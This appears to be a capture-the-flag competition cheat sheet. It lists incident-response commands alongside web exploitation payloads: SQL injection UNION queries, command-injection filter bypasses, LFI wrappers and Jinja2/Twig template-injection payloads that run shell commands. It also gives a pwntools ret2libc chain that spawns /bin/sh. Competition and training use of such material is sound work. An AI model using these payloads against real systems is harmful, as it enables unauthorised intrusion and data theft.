# Offline Field Manual & Cheat Sheet

Quick technical reference for offline usage during competition.

---

## 1. Linux Incident Response

```bash
# Check listening ports and process IDs
ss -tulpn

# Process tree with full command lines
ps auxf

# Files modified in the last 15 minutes
find /var/www /home /opt -mmin -15 -type f 2>/dev/null

# View running docker containers
docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Status}}\t{{.Ports}}"

# Access container shell
docker exec -it <container_id> /bin/bash
```

---

## 2. Web Exploitation Payloads

### SQL Injection

#### MySQL / MariaDB
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='flags'-- -
' UNION SELECT 1,flag,3 FROM flags ORDER BY id DESC LIMIT 1-- -
admin' -- -
' OR 1=1-- -
```

#### SQLite
```sql
' UNION SELECT 1,2,3--
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'--
' UNION SELECT 1,flag,3 FROM flags ORDER BY rowid DESC LIMIT 1--
```

#### PostgreSQL
```sql
' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='flags'--
' UNION SELECT null,flag FROM flags ORDER BY 1 DESC LIMIT 1--
```

---

### Command Injection Bypasses

```bash
# Space bypasses
cat$IFS$9/flag*
cat<flag.txt
{cat,/flag*}

# Keyword bypasses
c'a't /f*
c"a"t /f*
head -n 50 /f*
tail -n 50 /f*
tac /f*
base64 /f* | base64 -d
```

---

### Local File Inclusion (LFI) & PHP Wrappers

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
....//....//....//....//flag.txt
..%2f..%2f..%2f..%2fflag.txt
```

---

### Server-Side Template Injection (SSTI)

#### Jinja2 (Python / Flask)
```jinja2
{{ 7 * 7 }}
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag*').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /flag*').read() }}
```

#### Twig (PHP)
```twig
{{ 7 * 7 }}
{{ ['cat /flag*']|filter('system') }}
```

---

## 3. Pwn & Binary Exploitation

### Basic Pwntools Template
```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

io = remote('10.60.1.1', 9999, timeout=3)
io.sendline(b"cat /flag*")
print(io.recvall(timeout=2))
io.close()
```

### Cyclic Pattern (Finding RIP Offset)
```bash
# In Pwndbg / GDB:
cyclic 150
# After crash with segfault at 0x6161616a:
cyclic -l 0x6161616a
```

### Ret2libc Formula (x86_64)
```python
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Leak GOT:
payload = b"A" * offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])
io.sendline(payload)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Shell:
payload2 = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.symbols['system'])
io.sendline(payload2)
```

---

## 4. GDB / Pwndbg Reference

| Command | Action |
| :--- | :--- |
| `checksec` | Display binary protections (NX, Canary, PIE, RELRO). |
| `vmmap` | Display memory map and segment permissions. |
| `telescope $rsp 20` | Examine top 20 stack entries. |
| `x/10gx $rsp` | Dump 10 64-bit words at stack pointer in hex. |
| `search -s "FLAG"` | Search memory space for flag string. |
| `one_gadget libc.so.6` | Find one-gadget RCE addresses. |

---

## 5. Ghidra Binary Patching

1. Open binary in Ghidra -> Run Auto-Analyze.
2. Select vulnerable instruction in Listing view.
3. Press `Ctrl + Shift + G` (Patch Instruction).
4. Replace dangerous `CALL` with `NOP` (`0x90`) or set function start to `RET` (`0xC3`).
5. Export: `File -> Export Program -> Original File`.
6. Replace live binary on server and restart service.
